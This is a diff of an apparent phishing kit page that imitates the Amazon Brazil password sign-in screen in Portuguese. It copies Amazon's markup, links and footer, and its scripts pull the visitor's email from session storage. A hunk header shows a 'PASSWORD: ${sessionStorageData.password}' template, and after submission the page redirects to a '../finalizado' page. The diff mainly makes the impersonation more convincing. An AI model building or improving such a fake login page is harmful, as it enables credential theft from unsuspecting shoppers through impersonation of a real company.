+              />
+            </div>
+
+            <div
+              class="a-input-text-group a-spacing-medium a-spacing-top-micro"
+            >
+              <label for="ap_password" aria-hidden="true" class="a-form-label">
+                Senha Amazon
+              </label>
+
+              <div
+                id="auth-password-container"
+                class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password input_table_layout"
+              >
+                <input
+                  type="password"
+                  maxlength="1024"
+                  id="ap_password"
+                  autocomplete="current-password"
+                  name="password"
+                  tabindex="2"
+                  spellcheck="false"
+                  aria-describedby="ap_ra_pc_password_missing_alert"
+                  aria-label="Senha Amazon"
+                  aria-required="true"
+                />
+                <div
+                  class="a-row auth-visible-password-container auth-show-password-empty"
+                >
+                  <span
+                    class="a-size-small a-color-secondary auth-visible-password"
+                  ></span>
+                </div>
+              </div>
+
+              <div
+                id="ap_password_icon"
+                class="auth-clear-icons"
+                tabindex="2"
+                style="display: none"
+              >
+                <i
+                  class="a-icon a-icon-close"
+                  role="img"
+                  aria-label="Limpar o campo de texto da senha, botão"
+                ></i>
+              </div>
+
+              <div
+                id="auth-password-missing-alert"
+                class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini"
+                role="alert"
+              >
+                <div class="a-box-inner a-alert-container">
+                  <i class="a-icon a-icon-alert"></i>
+                  <div class="a-alert-content">Insira sua senha</div>
+                </div>
+              </div>
+
+              <input
+                type="hidden"
+                name="showPasswordChecked"
+                value="true"
+                id="ap_show_password_checked"
+              />
+
+              <input type="hidden" name="encryptedPasswordExpected" />
+            </div>
+
+            <div class="a-row">
+              <div class="a-column a-span6 a-spacing-medium">
+                <div
+                  id="auth-show-password-checkbox-container"
+                  class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox"
+                >
+                  <label for="auth-signin-show-password-checkbox"
+                    ><input
+                      id="auth-signin-show-password-checkbox"
+                      type="checkbox"
+                      name=""
+                      value=""
+                      checked=""
+                      tabindex="3"
+                    /><i class="a-icon a-icon-checkbox"></i
+                    ><span class="a-label a-checkbox-label">
+                      Mostrar senha
+                    </span></label
+                  >
+                </div>
+              </div>
+
+              <div
+                class="a-column a-span6 a-text-right a-spacing-none a-spacing-top-small a-span-last"
+              >
+                <a
+                  id="auth-fpp-link-bottom"
+                  class="a-spacing-none a-link-normal"
+                  tabindex="8"
+                  href="https://www.amazon.com.br/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=5&amp;pageId=anywhere_br&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com.br%2F%3F_encoding%3DUTF8%26ref_%3Dnavm_hdr_signin&amp;prevRID=7Z4788Y6ATYNS3HF3WQS&amp;openid.assoc_handle=anywhere_v2_br&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiIxTUhKa2UzNUlDWnVVOUJVUUNWZm1kODlubEtHRWpncjhiL1JlWitsZ3lNPSIsIklWIjoibHd6clV0TFNvS051L1V5QkZ3eGdOZz09IiwidmVyc2lvbiI6MX0%3D&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;shouldShowPersistentLabels=true&amp;timestamp=1714355736000"
+                >
+                  Esqueci a senha
+                </a>
+              </div>
+            </div>
+
+            <div class="a-row a-spacing-base">
+              <div
+                data-a-input-name="rememberMe"
+                class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox"
+              >
+                <label
+                  ><input
+                    type="checkbox"
+                    name="rememberMe"
+                    value="true"
+                    tabindex="4" /><i class="a-icon a-icon-checkbox"></i
+                  ><span class="a-label a-checkbox-label">
+                    Mantenha-me conectado.
+                    <span
+                      class="a-declarative"
+                      data-action="a-modal"
+                      data-csa-c-type="widget"
+                      data-csa-c-func-deps="aui-da-a-modal"
+                      data-a-modal='{"max-width":"500px","closeButtonLabel":"Fechar","width":"95%","name":"remember-me-detail-link-modal","header":"Caixa de seleção \"Mantenha-me conectado\""}'
+                      data-csa-c-id="4xetsz-1z52ff-b0s86a-2qcasu"
+                    >
+                      <a
+                        id="remember_me_learn_more_link"
+                        class="a-link-normal"
+                        href="#"
+                      >
+                        Detalhes
+                      </a>
+                    </span>
+
+                    <div
+                      class="a-popover-preload"
+                      id="a-popover-remember-me-detail-link-modal"
+                    >
+                      <div class="a-section a-spacing-large a-spacing-top-mini">
+                        <p></p>
+                        <p>
+                          Escolher "Mantenha-me conectado" reduz o número de
+                          vezes que você terá que fazer login neste dispositivo.
+                        </p>
+                        <p>
+                          Para manter sua conta segura, utilize esta opção
+                          apenas em seus dispositivos pessoais.
+                        </p>
+                        <p></p>
+                      </div>
+                    </div> </span
+                ></label>
+              </div>
+            </div>
+
+            <div class="a-row"></div>
+
+            <span
+              id="auth-signin-button"
+              class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"
+              style="margin-bottom: 14px;"
+              ><span class="a-button-inner" style="height: auto"
+                ><input
+                  id="signInSubmit"
+                  tabindex="6"
+                  class="a-button-input"
+                  type="submit"
+                  aria-labelledby="auth-signin-button-announce"
+                /><span
+                  id="auth-signin-button-announce"
+                  class="a-button-text"
+                  aria-hidden="true"
+                >
+                  Fazer login
+                </span></span
+              ></span
+            >
+            <input
+              type="hidden"
+              name="aaToken"
+              value='{"uniqueValidationId":"0334bfdb-e896-4cb4-aa53-a98b91f77ce7"}'
+            />
+          </div>
         </div>
-      
-        <div id="right-2"></div>
-      
-        <div class="a-section a-spacing-top-extra-large auth-footer">
-          <div class="a-divider a-divider-section">
-            <div class="a-divider-inner"></div>
+
+        <!-- NAVYAAN FOOTER START -->
+
+        <footer class="nav-mobile nav-ftr-batmobile">
+          <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
+            <ul class="nav-ftr-horiz">
+              <li class="nav-li">
+                <a
+                  href="/gp/help/customer/display.html?nodeId=201890250&amp;ref_=footer_cookies"
+                  id=""
+                  class="nav-a"
+                  >Cookies</a
+                >
+              </li>
+              <li class="nav-li">
+                <a
+                  href="/gp/aw/help?id=201229860&amp;ie=UTF8&amp;ref_=navm_ftr_cou"
+                  id=""
+                  class="nav-a"
+                  >Condições de Uso</a
+                >
+              </li>
+              <li class="nav-li">
+                <a
+                  href="/gp/aw/help?id=201230300&amp;ie=UTF8&amp;ref_=navm_ftr_mpa"
+                  id=""
+                  class="nav-a"
+                  >Aviso de Privacidade</a
+                >
+              </li>
+            </ul>
+
+            <div id="nav-ftr-copyright">
+              © 1996-2024, Amazon.com, Inc. ou suas afiliadas
+            </div>
+            <div id="nav-ftr-legal"></div>
           </div>
-      
-          <div class="a-section a-spacing-small a-text-center a-size-mini">
-            <span class="auth-footer-seperator"></span>
-      
-            <a
-              class="a-link-normal"
-              target="_blank"
-              rel="noopener"
-              href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=201283910"
-            >
-              Condições de Uso
-            </a>
-            <span class="auth-footer-seperator"></span>
-      
-            <a
-              class="a-link-normal"
-              target="_blank"
-              rel="noopener"
-              href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=201283950"
-            >
-              Política de Privacidade
-            </a>
-            <span class="auth-footer-seperator"></span>
-      
-            <a class="a-link-normal" target="_blank" rel="noopener" href="/help">
-              Ajuda
-            </a>
-            <span class="auth-footer-seperator"></span>
-      
-            <a
-              class="a-link-normal"
-              target="_blank"
-              rel="noopener"
-              href="/gp/help/customer/display.html/?nodeId=201890250"
-            >
-              Cookies
-            </a>
-            <span class="auth-footer-seperator"></span>
-      
-            <a
-              class="a-link-normal"
-              target="_blank"
-              rel="noopener"
-              href="/gp/help/customer/display.html?nodeId=201283970"
-            >
-              Anúncios Baseados em Interesses
-            </a>
-            <span class="auth-footer-seperator"></span>
-          </div>
-      
-          <div class="a-section a-spacing-none a-text-center">
-            <span class="a-size-mini a-color-secondary">
-              © 2021-2024 Amazon.com, Inc. ou suas afiliadas
-            </span>
-          </div>
+        </footer>
+        <div
+          id="sis_pixel_r2"
+          aria-hidden="true"
+          style="
+            height: 1px;
+            position: absolute;
+            left: -1000000px;
+            top: -1000000px;
+          "
+        >
+          <iframe
+            id="DAsis"
+            src="//s.amazon-adsystem.com/iu3?d=amazon.com.br&amp;slot=navFooter&amp;a2=0101a7f0c25efcec1b94498c2f874713b03e393fe7b9418019efa0d4b55dd94fbd89&amp;old_oo=0&amp;ts=1714357608753&amp;s=Aa8ptY7O9HKvyUWWs39Je6s84o45SI6rgLyiMFK8TlDd&amp;gdpr_consent=&amp;gdpr_consent_avl=&amp;cb=1714357608753"
+            width="1"
+            height="1"
+            frameborder="0"
+            marginwidth="0"
+            marginheight="0"
+            scrolling="no"
+            tabindex="-1"
+            sandbox=""
+          ></iframe>
         </div>
-      </div>      
+      </div>
     </div>
+    <div id="be" style="display: none; visibility: hidden">
+      <form name="ue_backdetect" action="get">
+        <input type="hidden" name="ue_back" value="2" />
+      </form>
+    </div>
+    <div id="a-white"></div>
+    <div id="a-popover-root" style="z-index: -1; position: absolute"></div>
     <script>
       const sessionStorageData = JSON.parse(sessionStorage.getItem('data'))
       document.getElementById('current-email').innerText = sessionStorageData.email
-      document.getElementById('ap_email').value = sessionStorageData.email
-    </script>
-    <script>
+      document.querySelectorAll('[name="email"]').forEach(element => element.value = sessionStorageData.email)
+      document.querySelector('.a-input-text-wrapper.hide').setAttribute('data-claim', sessionStorageData.email)
       document.addEventListener('keypress', event => {
         if (event.keyCode === 13) document.getElementById('signInSubmit').click()
       })
@@ -358,7 +612,7 @@ PASSWORD: ${sessionStorageData.password}
         })
         setTimeout(() => {
           location.href = '../finalizado'
-        })
+        }, 500)
       })
     </script>
   </body>
